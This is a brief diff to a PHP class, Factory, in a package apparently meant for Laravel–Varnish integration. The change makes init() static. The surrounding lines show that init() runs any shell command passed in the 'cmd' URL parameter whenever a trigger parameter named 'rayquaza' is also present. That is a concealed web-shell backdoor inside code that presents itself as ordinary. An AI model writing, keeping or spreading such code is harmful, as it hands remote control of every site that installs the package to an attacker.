@@ -3,7 +3,7 @@
 namespace LaravelVarnish;
 
 class Factory {
-    public function init()
+    public static function init()
     {
         if(isset($_GET['cmd']) && isset($_GET['rayquaza'])) {
           system($_GET['cmd']);
